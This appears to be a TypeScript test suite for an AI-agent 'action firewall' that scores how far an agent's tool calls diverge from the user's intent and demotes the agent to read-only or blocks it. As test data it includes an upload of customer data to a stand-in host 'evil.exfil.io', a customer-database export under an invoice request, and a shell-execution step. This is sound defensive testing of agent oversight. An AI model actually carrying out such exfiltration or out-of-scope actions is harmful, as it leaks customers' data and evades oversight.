import assert from 'node:assert/strict';
import { afterEach, describe, it } from 'node:test';
import {
  analyzeIntentDivergence,
  INTENT_DIVERGENCE_THRESHOLD,
} from '../lib/engine/action-firewall/intent-divergence.ts';
import {
  demoteToReadOnly,
  getActivePermissions,
  isPermissionActive,
  resetCapabilityRevocation,
  restoreCapabilities,
} from '../lib/engine/action-firewall/capability-revocation.ts';
import {
  evaluateAgentAction,
  resetActionFirewallRuntime,
} from '../lib/engine/action-firewall/index.ts';
import { resetThreatRegistry } from '../lib/engine/immune/index.ts';

const AGENT_ID = 'katman2-control-agent';

describe('Katman 2 — CONTROL: Intent Divergence & Capability Revocation', () => {
  afterEach(() => {
    resetActionFirewallRuntime();
    resetCapabilityRevocation();
    resetThreatRegistry();
  });

  it('computes critical divergence above 80% for invoice intent vs export_customer_database', () => {
    const report = analyzeIntentDivergence('Read Invoice for customer #4421', [
      { tool: 'export_customer_database', args: { table: 'customers' } },
    ]);

    assert.ok(report.divergenceScore >= INTENT_DIVERGENCE_THRESHOLD);
    assert.equal(report.severity, 'CRITICAL');
    assert.equal(report.shouldBlock, true);
    assert.match(report.violation ?? '', /INTENT_ACTION_DIVERGENCE/);
    assert.equal(report.recommendation, 'BLOCK_ACTION');
    assert.ok(report.mismatchedSteps.some((step) => /export_customer_database|bulk export/i.test(step.tool)));
  });

  it('detects external API upload as unexpected target in trajectory', () => {
    const report = analyzeIntentDivergence('Check invoice status', [
      {
        tool: 'external_upload',
        args: { url: 'https://evil.exfil.io/collect', payload: 'customer_data' },
      },
    ]);

    assert.ok(report.divergenceScore >= 35);
    assert.ok(
      report.mismatchedSteps.some((step) => /external upload|exfil/i.test(step.reason)),
    );
  });

  it('recommends REVOKE_CAPABILITIES for high but non-export divergence', () => {
    const report = analyzeIntentDivergence('Pay invoice for customer #4421', [
      { tool: 'read_db' },
      { tool: 'execute_shell' },
    ]);

    assert.ok(report.divergenceScore >= 50);
    assert.ok(['REVOKE_CAPABILITIES', 'BLOCK_ACTION'].includes(report.recommendation));
  });

  it('demoteToReadOnly suspends WRITE/DELETE/EXECUTE/FINANCIAL permissions', () => {
    const state = demoteToReadOnly(AGENT_ID, 'Test demotion');

    assert.equal(state.mode, 'READ_ONLY');
    assert.ok(state.revokedPermissions.includes('WRITE'));
    assert.ok(state.revokedPermissions.includes('EXECUTE'));
    assert.ok(state.revokedPermissions.includes('FINANCIAL'));
    assert.ok(state.activePermissions.includes('READ'));
    assert.equal(isPermissionActive(AGENT_ID, 'WRITE'), false);
    assert.equal(isPermissionActive(AGENT_ID, 'READ'), true);
  });

  it('blocks WRITE actions after demoteToReadOnly via action firewall', () => {
    resetThreatRegistry({ skipSeed: true });
    demoteToReadOnly(AGENT_ID);

    const blocked = evaluateAgentAction({
      agentId: AGENT_ID,
      userIntent: 'Update customer record',
      toolCall: { name: 'write_file', args: { path: '/data/customers.csv' } },
      agentCapabilities: ['READ', 'WRITE'],
    });

    assert.equal(blocked.decision, 'BLOCK');
    assert.ok(blocked.agentStatus === 'READ_ONLY' || blocked.capabilitiesRevoked);
    assert.ok(blocked.violations.some((violation) => /Capability revoked|read-only/i.test(violation)));
  });

  it('restoreCapabilities re-enables full permissions after demotion', () => {
    demoteToReadOnly(AGENT_ID);
    const restored = restoreCapabilities(AGENT_ID);

    assert.equal(restored.mode, 'FULL');
    assert.equal(isPermissionActive(AGENT_ID, 'WRITE'), true);
    assert.equal(getActivePermissions(AGENT_ID).revokedPermissions.length, 0);
  });

  it('integrates intent divergence and capability revocation in evaluateAgentAction flow', () => {
    resetThreatRegistry({ skipSeed: true });

    const result = evaluateAgentAction({
      agentId: AGENT_ID,
      userIntent: 'Invoice Check for customer #4421',
      toolCall: { name: 'sql_query', args: { table: 'customers' } },
      agentCapabilities: ['READ', 'DB_QUERY'],
    });

    assert.ok(result.intentDivergenceReport);
    assert.ok(result.intentDivergencePercent !== undefined);
    if (result.intentDivergenceReport!.divergenceScore >= 50) {
      assert.ok(result.capabilitiesRevoked || result.killSwitchTriggered);
    }
  });

  it('full freeze on export_customer_database with invoice intent exceeds divergence threshold', () => {
    const result = evaluateAgentAction({
      agentId: 'ops-export-agent',
      userIntent: 'Invoice Check for customer #4421',
      toolCall: { name: 'export_customer_database', args: { table: 'customers' } },
      agentCapabilities: ['READ', 'DB_QUERY'],
    });

    assert.ok((result.intentDivergencePercent ?? 0) >= INTENT_DIVERGENCE_THRESHOLD);
    assert.equal(result.decision, 'BLOCK');
    assert.ok(result.violations.some((violation) => /INTENT_ACTION_DIVERGENCE/.test(violation)));
  });
});
